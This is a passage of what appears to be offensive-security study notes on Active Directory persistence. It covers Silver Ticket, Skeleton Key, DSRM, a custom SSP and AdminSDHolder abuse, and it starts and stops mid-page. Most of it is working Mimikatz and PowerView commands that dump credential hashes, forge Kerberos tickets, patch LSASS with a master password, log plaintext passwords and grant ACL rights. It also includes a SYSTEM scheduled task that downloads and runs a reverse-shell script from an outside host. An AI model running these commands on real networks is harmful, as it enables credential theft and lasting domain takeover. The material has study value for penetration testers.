</span></pre></table></code></div></div><h1 id="silver-ticket"><span style="color:lightblue">Silver Ticket</span></h1><ul><li>We will be abusing the 5th step in the Kerberos system with the help of a silver ticket.<li>A valid TGS (Golden ticket is TGT).<li>Encrypted and Signed by the NTLM hash of the service account (Golden ticket is signed by hash of krbtgt) of the service running with that account.<li>Services rarely check PAC (Privileged Attribute Certificate).<li>Services will allow access only to the services themselves.<li>Reasonable persistence period (default 30 days for computer accounts).</ul><p>List of SPN’s : https://adsecurity.org/?page_id=183</p><h2 id="methodologysteps-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Get a Powershell session as a <strong>“domain admin”</strong> using <strong>“Over pass the hash”</strong> attack<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Create a <strong>New-PSSession</strong> attaching to the <strong>“domain controller”</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Enter the new session using <strong>Enter-PSSession</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />4. Bypass the <em>AMSI</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />5. Exit<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />6. Load <strong>Mimikatz.ps1</strong> on the new session using <strong>Invoke-command</strong><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />7. Enter the new session using <strong>Enter-PSSession</strong> <em>again</em><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />8. Now we can execute mimikatz on the DC<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />9. Keep note of <strong>krbtgt</strong> hash<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />10. Request access for service of DC using the rc4 hash<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />11. Schedule and execute a task</ul><h2 id="invoke-mimikatz-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-execute-mimikatz-on-dc-as-da-to-get-krbtgt-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Execute mimikatz on DC as DA to get krbtgt hash</span></span><a href="#1-execute-mimikatz-on-dc-as-da-to-get-krbtgt-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-using-hash-of-the-domain-controller-computer-account-below-command-provides-access-to-shares-on-the-dc"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Using hash of the Domain Controller computer account, below command provides access to shares on the DC</span></span><a href="#2-using-hash-of-the-domain-controller-computer-account-below-command-provides-access-to-shares-on-the-dc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /domain:star-dc /sid:admin-sid-here /target:star-dc /service:CIFS /rc4:rc4-hash-here /user:Administrator /ptt"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="3-schedule-and-execute-a-task"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Schedule and execute a task</span></span><a href="#3-schedule-and-execute-a-task" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">star-dc</span><span class="w"> </span><span class="nx">/SC</span><span class="w"> </span><span class="nx">Weekly</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"NT Authority\SYSTEM"</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"STCheck"</span><span class="w"> </span><span class="nx">/TR</span><span class="w"> </span><span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8080/Invoke-PowerShellTcp.psi''')'"</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/Run</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">star-dc</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"STCheck"</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-warning"><div><p>For accessing WMI, we have to create two tickets: one for HOST service and another for RPCSS</p></div></blockquote><h1 id="skeleton-key"><span style="color:lightblue">Skeleton Key</span></h1><ul><li>Skeleton key is a persistence technique where it is possible to patch a Domain Controller (Lsass process) so that it allows access as any user with a single password.<li>The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.<li>All the publicly known methods are <strong>NOT persistent across reboots</strong>.</ul><h2 id="methodologysteps-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Inject the Skeleton key in the DC<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Now we can access any machine with password as <code class="language-plaintext highlighter-rouge">mimikatz</code></ul><h2 id="invoke-mimikatz-2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-use-the-below-command-to-inject-a-skeleton-key"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Use the below command to inject a skeleton-Key</span></span><a href="#1-use-the-below-command-to-inject-a-skeleton-key" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"privilege::debug" "misc::skeleton'</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer-name</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Skeleton Key password is : <strong>mimikatz</strong></p></div></blockquote><h3 id="2-now-we-can-access-any-machine-with-valid-username-and-password-as-mimikatz"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Now we can access any machine with valid username and password as mimikatz</span></span><a href="#2-now-we-can-access-any-machine-with-valid-username-and-password-as-mimikatz" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer-name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-credential</span><span class="w"> </span><span class="nx">dcorp\Administrator</span><span class="w">
</span></pre></table></code></div></div><h2 id="extra-commands-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Extra Commands</span></span><a href="#extra-commands-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="lsass-running-as-a-protected-process"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">LSASS running as a protected process</span></span><a href="#lsass-running-as-a-protected-process" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="gp">mimikatz #</span><span class="w"> </span>privilege::debug
<span class="gp">mimikatz #</span><span class="w"> </span><span class="o">!</span>+
<span class="gp">mimikatz #</span><span class="w"> </span><span class="o">!</span>processprotect /process:lsass.exe /remove
<span class="gp">mimikatz #</span><span class="w"> </span>misc::skeleton
<span class="gp">mimikatz #</span><span class="w"> </span><span class="o">!</span>-
</pre></table></code></div></div><blockquote class="prompt-warning"><div><p>The above would be very noisy in logs - Service installation (Kernel mode driver)</p></div></blockquote><h1 id="directory-service-restore-mode-dsrm"><span style="color:lightblue">Directory Service Restore Mode (DSRM)</span></h1><ul><li>DSRM is Directory Services Restore Mode<li>There is a local administrator on every DC called “Administrator” whose password is the DSRM password<li>DSRM password (<strong>SafeModePassword</strong>) is required when a server is promoted to Domain Controller and it is rarely changed<li>After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.</ul><h2 id="methodologysteps-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Methodology/Steps</span></span><a href="#methodologysteps-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><ul class="task-list"><li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />1. Extract the credentials from the SAM file from the DC<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />2. Change the Logon Behavior for the DSRM account<li class="task-list-item" hide-bullet><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />3. Pass The Hash of the DSRM administrator and logon</ul><h2 id="invoke-mimikatz-3"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-Mimikatz</span></span><a href="#invoke-mimikatz-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1-dump-dsrm-password-needs-da-privs"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">1. Dump DSRM password (needs DA privs)</span></span><a href="#1-dump-dsrm-password-needs-da-privs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"token::elevate" "lsadump::sam"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><h3 id="2-compare-the-administrator-hash-with-the-administrator-hash-of-below-command"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">2. Compare the Administrator hash with the Administrator hash of below command</span></span><a href="#2-compare-the-administrator-hash-with-the-administrator-hash-of-below-command" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>If the NTML hash of the Administrator using the <strong>/patch</strong> is <em>diffrent</em> than the NTML hash of the Administrator using <strong>DSRM dump</strong> then it is the correct hash of the DSRM local Administrator</p></div></blockquote><h3 id="3-addedit-the-logon-behavior-for-the-dsrm-account"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">3. Add/Edit the Logon Behavior for the DSRM account</span></span><a href="#3-addedit-the-logon-behavior-for-the-dsrm-account" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Since it is the local administrator of the DC, we can pass the hash to authenticate. But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c">#Get a session as the DC</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">dcorp-dc</span><span class="w">
</span><span class="c">#check DSRM property</span><span class="w">
</span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span><span class="w">
</span><span class="c">#If DSRMAdminLognonBehariour attribute not created then create and set</span><span class="w">
</span><span class="n">New-ItemProperty</span><span class="w"> </span><span class="s2">"HKLM:\System\CurrentControlSet\Control\Lsa\"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"DsrmAdminLogonBehavior"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="nx">DWORD</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="c">#If already present but wrong value , then update</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s2">"DsrmAdminLogonBehavior"</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span></pre></table></code></div></div><h3 id="4-use-below-command-to-pass-the-hash"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">4. Use below command to pass the hash</span></span><a href="#4-use-below-command-to-pass-the-hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:dsrm-hash-goes-here /run:powershell.exe"'</span><span class="w">
</span></pre></table></code></div></div><h3 id="5-now-we-can-run-commands-on-the-dc"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">5. Now we can run commands on the DC</span></span><a href="#5-now-we-can-run-commands-on-the-dc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\dcorp-dc\c</span><span class="err">$</span><span class="w">
</span></pre></table></code></div></div><h1 id="custom-security-support-provider-ssp"><span style="color:lightblue">Custom Security Support Provider (SSP)</span></h1><p>A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are</p><ul><li>NTLM<li>Kerberos<li>Wdigest<li>CredSSP</ul><p>Mimikatz provides a custom SSP - mimilib.dll. The SSP logs start from the <strong>next reboot</strong> of the machine. This SSP logs local logons, service account and machine account passwords in clear text on the target server.</p><h2 id="mimikatz-how-to-setup-the-ssp"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Mimikatz (How to setup the SSP)</span></span><a href="#mimikatz-how-to-setup-the-ssp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="method-1"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Method 1</span></span><a href="#method-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Drop the mimilib.dll to system32 and add mimilib to <code class="language-plaintext highlighter-rouge">"HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages"</code></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$packages</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\Ccontrol\Lsa\OSconfig\</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="w">
</span><span class="nv">$packages</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"mimilib"</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\control\Lsa\OSconfig\</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$packages</span><span class="w">
</span><span class="n">Set-ItemProperty</span><span class="w"> </span><span class="nx">HKLM:\SYSTEM\CurrentControlSet\control\Lsa\</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="s1">'Security Packages'</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$packages</span><span class="w">
</span></pre></table></code></div></div><h3 id="method-2"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Method 2</span></span><a href="#method-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Using mimikatz, inject into Isass (Not stable with Server 2016):</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"misc::memssp"'</span><span class="w"> 
</span></pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Now you can view all the local logo n logs with the credentials in <code class="language-plaintext highlighter-rouge">C:\Windows\System32\kiwissp.log</code></p></div></blockquote><h1 id="acl---adminsdholder"><span style="color:lightblue">ACL - AdminSDHolder</span></h1><ul><li><p>Resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called Protected Groups).</p><li><p>Security Descriptor Propagator (SDPROP) runs every hour and compares the ACL of protected groups and members with the ACL of AdminSDHolder and any differences are overwritten on the object ACL.</p></ul><h2 id="invoke-sdpropagator"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Invoke-SDPropagator</span></span><a href="#invoke-sdpropagator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="run-sdprop-manually"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Run SDProp manually</span></span><a href="#run-sdprop-manually" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-SDPropagator</span><span class="w"> </span><span class="nt">-timeoutMinutes</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-showProgress</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="for-pre-server-2008-machines"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">For Pre-Server 2008 machines</span></span><a href="#for-pre-server-2008-machines" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-SDPropagator</span><span class="w"> </span><span class="nt">-taskname</span><span class="w"> </span><span class="nx">FixUpInheritance</span><span class="w"> </span><span class="nt">-timeoutMinutes</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-showProgress</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h2 id="-powerview-dev-branch"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2"> Powerview (DEV branch)</span></span><a href="#-powerview-dev-branch" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="add-full-control-permissions-for-a-user-to-the-adminsdholder"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Add full control permissions for a user to the AdminSDHolder</span></span><a href="#add-full-control-permissions-for-a-user-to-the-adminsdholder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-TargetADSprefix</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System'</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">user1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="other-interesting-permissions--reset-password-write-members-for-a-user-to-the-adminsdholder"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Other Interesting permissions ( Reset-password, Write-members) for a user to the AdminSDHolder</span></span><a href="#other-interesting-permissions--reset-password-write-members-for-a-user-to-the-adminsdholder" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-TargetADSprefix</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System'</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">user1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Add-ObjectAcl</span><span class="w"> </span><span class="nt">-TargetADSprefix</span><span class="w"> </span><span class="s1">'CN=AdminSDHolder,CN=System'</span><span class="w"> </span><span class="nt">-PrincipalSamAccountName</span><span class="w"> </span><span class="nx">user1</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">WriteMembers</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="check-domain-admin-perms"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Check Domain Admin perms</span></span><a href="#check-domain-admin-perms" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'user1'</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="abusing-resetpasswordforcechangepassword"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Abusing ResetPassword/ForceChangePassword</span></span><a href="#abusing-resetpasswordforcechangepassword" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">testda</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"Password@123"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><h3 id="abusing-forcechangepassword-with-a-different-users-creds"><span class="mr-2"><span style="color:#F1C232"><span class="mr-2">Abusing ForceChangePassword with a different user’s creds</span></span><a href="#abusing-forcechangepassword-with-a-different-users-creds" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView_dev.ps1</span><span class="w">
</span><span class="c">#Setting password for runas user for</span><span class="w">
</span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="c">#Setting password for runas user for</span><span class="w">
